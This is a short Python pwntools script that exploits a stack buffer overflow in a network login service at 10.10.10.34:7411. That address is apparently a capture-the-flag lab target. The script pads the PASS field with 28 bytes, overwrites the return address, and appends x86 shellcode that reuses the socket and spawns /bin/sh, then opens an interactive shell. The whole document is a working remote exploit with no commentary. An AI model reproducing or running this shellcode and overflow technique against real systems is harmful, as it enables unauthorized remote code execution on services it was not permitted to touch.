#!/usr/bin/python3
from pwn import remote

offset = 28
junk = b"A" * 28
eip = b"\x30\xd6\xff\xff"

shellcode  = b""
shellcode += b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80"

payload = junk + eip + shellcode

shell = remote("10.10.10.34", 7411)
shell.recvuntil(b"OK Ready. Send USER command.")
shell.sendline(b"USER admin")
shell.recvuntil(b"OK Send PASS command.")
shell.sendline(b"PASS " + payload)
shell.interactive()
